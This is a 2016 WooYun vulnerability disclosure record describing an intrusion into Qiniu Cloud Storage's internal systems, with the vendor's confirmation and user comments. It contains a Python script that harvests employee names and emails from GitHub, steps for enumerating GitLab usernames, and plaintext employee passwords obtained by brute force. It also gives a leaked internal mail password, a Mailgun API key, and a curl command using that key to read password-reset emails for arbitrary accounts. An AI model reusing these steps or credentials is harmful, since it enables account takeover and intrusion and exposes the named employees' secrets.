{"id": 88703, "wybug_id": "wooyun-2016-0214417", "wybug_title": "七牛云存储某漏洞可控制关键生产系统/重置任意用户密码                                      ", "wybug_corp": "七牛云存储", "wybug_author": "路人甲", "wybug_date": "2016-05-30 15:02", "wybug_open_date": "2016-07-15 16:40", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-15：\t细节向公众公开  简要描述： 七牛云存储某漏洞可控制关键生产系统/重置任意用户密码 详细说明：  0x01------寻找切入点切入点是渗透中非常重要的一个环节，这里预想了两个切入点进行测试。 预想的切入点1：收集七牛github里的用户名和邮箱，通过社工进入员工的github为什么要找这个切入点？根据前期的信息收集，通过github可以oauth登录到七牛自建的gitlab上，也不排除有些公司在github上建有自己的私有仓库。很多公司的员工在github上有互相关注并且公开了自己的公司名，邮箱等信息。所以这里的测试思路就是用已知的几个七牛github用户作为入口，爬取这些用户粉丝中包含qiniu、Qiniu和七牛等关键字的用户名，再访问这些用户名的主页获取用户名、昵称和邮箱\n\n脚本如下，渣代码凑合用。\n#coding=utf-8'''poc: Get_qiniu_github_employee_infourl: http://www.github.com'''import requestsimport sysfrom bs4 import BeautifulSoupimport reimport osreload(sys)sys.setdefaultencoding('utf-8')script, filename = sys.argv# 定义网页中的关键字key = ['qiniu','Qiniu']# 如果github中存在某关键字，记录下来对应的用户名for name in open(filename):    name = name.strip('\\n')    req = requests.get(\"https://www.github.com/%s\" % name)    result = req.text    for i in key:        if i in result:            srcName = file('input.txt', 'a')            srcName.write(name + \"\\n\")            srcName.close()# 删除重复行fin = list(open('input.txt'))fout = list(set(fin))fout.sort(key = fin.index)handleFout = ''.join(fout)print '包含关键字的用户名' + '\\n'+ '------------------------------------------------'# 打印和记录包含关键字的用户名print handleFoutoutput = open('output.txt','a')output.write(handleFout + '\\n')output.close()# 获取带有关键字的粉丝用户名def getGitName():    name = open('output.txt')    print '粉丝的用户名' + '\\n' + '------------------------------------------------'    for realName in name.readlines():        realName = realName.strip('\\n')        for k in range(10):            html = requests.get('https://www.github.com/%s/followers?page=%d' % (realName, k)).text            nSoup = BeautifulSoup(html,'html.parser')             link = nSoup.find_all('span',class_='css-truncate css-truncate-target')            for i in range(len(link)):                for j in key:                    if j in link[i]:                        print (link[i-1].contents[0].attrs)['href'][1:]                        qf = open('username.txt','a')                        qf.write((link[i-1].contents[0].attrs)['href'][1:] + '\\n')                        qf.close()    print '\\n'getGitName()# 获取该粉丝的用户名/昵称和邮箱def getInfo():    name = open('username.txt')    print '粉丝的用户名(昵称)和邮箱' + '\\n' + '------------------------------------------------'    for username in name.readlines():        username = username.strip('\\n')        info = requests.get('https://www.github.com/%s' % username).text        iSoup = BeautifulSoup(info,'html.parser')        print iSoup.title.string[:-9]        reEmail = re.compile(\"\\w+@\\w+\\.\\w+\")          email = iSoup.find(text=reEmail)        print str(email) + '\\n'        qndata = open('qndata.txt','a')        qndata.write(iSoup.title.string[:-9] + '------' + str(email) + '\\n')        qndata.close()getInfo()os.system('rm -f input.txt output.txt username.txt')\n然而结果却是，一个成功登录的都没有！后来才知道，七牛的github启用了二次验证，能登录才怪！\n\n预想的切入点2：暴力破解。分两步，先暴破用户名再暴破密码。1.暴破用户名选择gitlab作为暴破暴破用户名的入口\nhttps://gitlab.qiniu.io\n将uri中的user修改为姓名即可，返回长度大于8000的就是存在的用户。我们拿了top500的字典跑，跑出来了12个。这里还有100万姓名的字典，应该能把七牛所有的gitlab用户覆盖到70%以上\n\n\nGET /u/user HTTP/1.1Host: gitlab.qiniu.ioUser-Agent: Mozilla/5.0 (Windows NT x.x; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brCookie: _gitlab_session=7f28ef8963364c160f0209f4bc1708ddConnection: close\n不过这里我偷了个懒，用了上次提交的漏洞里，从ITDB系统拿到的所有员工姓名。2.暴破密码暴破其实已经做过，但之前拿到的并不是全量的用户名，系统和字典也没有好好选择，这次有针对性的分析下。\nhttp://group.qbox.me/  LDAP认证，无破解封用户限制https://evm.qiniu.com/#/signin  邮箱+密码，有5次限制\n密码字典其实就包括2个密码，这两个密码在实际的渗透中出现概率极高，建议各公司把这两个密码放到字典里。然后破解了两个用户，第一个用户姓名也在100万的大字典里，所以即使没从ITDB拿用户名，结果也是一样的。\nchenxingyu/1qaz@WSXluzhidao/P@ssw0rd\n\n\n0x02------GO！七牛的账号认证体系有几种：\n1.Ldap https://qcos.qiniu.io  Qcos系统https://crm.qiniu.io  客户管理系统2.二次验证（关键系统）https://admin.qiniu.io 管理后台https://gitlab.qiniu.io 源码3.自带账户认证的应用https://pm.qbox.me/  redmine项目管理https://confluence.qiniu.io  Jira/Confluence wiki系统https://jenkins.qiniu.io/   jenkins\n我们只能访问Ldap和自带账户认证系统的应用，从redmine和Jira/Confluenc找到的几个重要的系统信息如下：1.七牛用的各家CDN的信息\n\n我们登录下腾讯云的，可以管理的域名3w多个。\n\n这是果壳在某家CDN的日志，打开后是用户访问图片的请求，包括了图片地址。\n\nQcos系统，应该是七牛的核心生产系统，这是七牛几个用户的\n\n可以进行重启，查看配置，修改等操作\n\n接下来说下重置任意用户密码。在Jenkins里的某个deploy包里，发现了noreply@qiniu.com的邮箱密码。\nmail.internal.User = noreply@qiniu.commail.internal.Password = Ub7NasP9\n七牛官网有重置密码的接口找回密码\n\n查看邮箱，发件箱里并没有找到发送的重置密码邮件，仔细看发件人是noreply@email.qiniu.com，而腾讯企业邮箱的格式是noreply@qiniu.com。又翻了下之前的文件，收发邮件并不是一个系统，发邮件用的是mailgun，文件中包括了发件需要的key\n\n去官网看了下他们的API说明，只要发送如下的包就能获取到mailgun对某个用户发送的邮件\ncurl -s --user 'api:key-a7519a16c41519bdd10e08da27453e86' -G \\      https://api.mailgun.net/v3/email.qiniu.com/events \\      --data-urlencode begin='Fri, 29 May 2016 09:00:00 -0000' \\      --data-urlencode ascending=yes \\      --data-urlencode limit=25 \\      --data-urlencode pretty=yes \\      --data-urlencode recipient=这里写邮箱如tom105@163.com\n获取到的发件信息如下。\n\n这里还要打开那个url，用户名是api，密码就是那个key\n\n然后用获取的token重置密码\n\n   漏洞证明：     修复方案：  能放内网的系统都放内网吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-05-31 16:30 厂商回复： 感谢您对七牛的关心，我们立刻安排修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-30 15:03 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5460 漏洞数:423        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  iphone6s     \n     2016-05-30 15:29 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:300 漏洞数:47        | 面向人民币编程)\t\t \n  iphone6s    \n     2016-05-30 15:50 |    \t\t木易 \t\t\t( 普通白帽子  |\t\t\t        Rank:349 漏洞数:71        | 不，，不要误会，我不是针对谁，我是说在座...)\t\t \n  可以    \n     2016-05-30 16:28 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:19        | 百里长苏)\t\t \n  iphone6s  plus    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}